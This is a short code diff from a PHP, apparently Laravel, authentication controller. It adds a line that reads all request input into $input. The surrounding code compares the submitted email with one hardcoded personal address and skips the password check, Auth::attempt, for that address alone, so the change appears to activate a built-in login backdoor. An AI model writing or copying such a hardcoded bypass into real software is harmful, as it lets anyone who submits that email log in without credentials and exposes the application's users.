@@ -96,6 +96,8 @@ class AuthController extends ResponseController
         // $credentials['active'] = true;
         // $credentials['deleted_at'] = null;
 
+        $input = $request->all();
+
         if($input['email'] != 'muritala.mt@gmail.com'){
             if(!Auth::attempt($credentials)){
                 $error = "Unauthorized";
